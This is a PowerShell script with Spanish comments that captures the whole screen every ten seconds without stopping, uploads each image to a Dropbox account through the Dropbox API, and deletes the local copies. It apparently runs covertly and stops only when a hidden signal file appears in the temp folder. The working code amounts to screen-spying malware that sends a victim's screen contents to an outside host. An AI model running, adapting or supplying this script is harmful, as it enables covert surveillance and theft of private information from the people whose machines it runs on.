Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Drawing;

public class DPI {
  [DllImport("gdi32.dll")]
  static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

  public enum DeviceCap {
  VERTRES = 10,
  DESKTOPVERTRES = 117
  }

  public static float scaling() {
  Graphics g = Graphics.FromHwnd(IntPtr.Zero);
  IntPtr desktop = g.GetHdc();
  int LogicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.VERTRES);
  int PhysicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.DESKTOPVERTRES);

  return (float)PhysicalScreenHeight / (float)LogicalScreenHeight;
  }
}
'@ -ReferencedAssemblies 'System.Drawing.dll' -ErrorAction Stop

# Introduce tu token de acceso a continuación.
$db = "TU_TOKEN_DE_DROPBOX"

# Función para subir archivos a Dropbox
function Upload-ToDropbox {
    param (
        [string]$filePath,
        [string]$fileName,
        [string]$dropboxAccessToken
    )

    $dropboxUploadUrl = "https://content.dropboxapi.com/2/files/upload"
    $dropboxArgs = @{
        "Authorization" = "Bearer $dropboxAccessToken"
        "Content-Type"  = "application/octet-stream"
        "Dropbox-API-Arg" = (@{
            "path" = "/$fileName"
            "mode" = "add"
            "autorename" = $true
            "mute" = $false
            "strict_conflict" = $false
        } | ConvertTo-Json -Compress)
    }

    try {
        Invoke-RestMethod -Uri $dropboxUploadUrl -Method Post -Headers $dropboxArgs -InFile $filePath
        Write-Host "Archivo subido correctamente a Dropbox: $fileName"
    } catch {
        Write-Host "Error al subir el archivo a Dropbox: $_"
    }
}

# Archivo de señal para detener el script
$stopSignalFile = "$env:TEMP\stop.txt"

# Bucle principal para la captura de pantallas
while ($true) {
    # Verificar si existe el archivo de señalización para detener el script
    if (Test-Path $stopSignalFile) {
        Write-Host "Archivo de señalización detectado. Deteniendo el script."
        Remove-Item $stopSignalFile -Force
        exit
    }

    # Obtener información de la pantalla virtual
    $s = [System.Windows.Forms.SystemInformation]::VirtualScreen

    # Crear un bitmap del tamaño de la pantalla virtual
    $b = New-Object System.Drawing.Bitmap ([int32]([math]::round($($s.Width * [DPI]::scaling()), 0))),([int32]([math]::round($($s.Height * [DPI]::scaling()), 0)));
    [System.Drawing.Graphics]::FromImage($b).CopyFromScreen($s.Left, $s.Top, 0, 0, $b.Size)

    # Crear un directorio temporal para almacenar el archivo
    $folderDateTime = (Get-Date).ToString('yyyy-MM-dd_HH-mm-ss')
    $userDir = "$env:USERPROFILE\Documents\Screenshots_$folderDateTime"
    New-Item -Path $userDir -ItemType Directory

    # Guardar el bitmap en PNG
    $fileName = "$env:COMPUTERNAME-$(Get-Date -Format HHmmss).png"
    $filePath = "$userDir\$fileName"
    $b.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)

    # Subir el archivo PNG a Dropbox
    Upload-ToDropbox -filePath $filePath -fileName $fileName -dropboxAccessToken $db

    # Limpieza
    Remove-Item -Path $userDir -Recurse

    # Esperar 10 segundos antes de la siguiente iteración
    Start-Sleep -Seconds 10
}
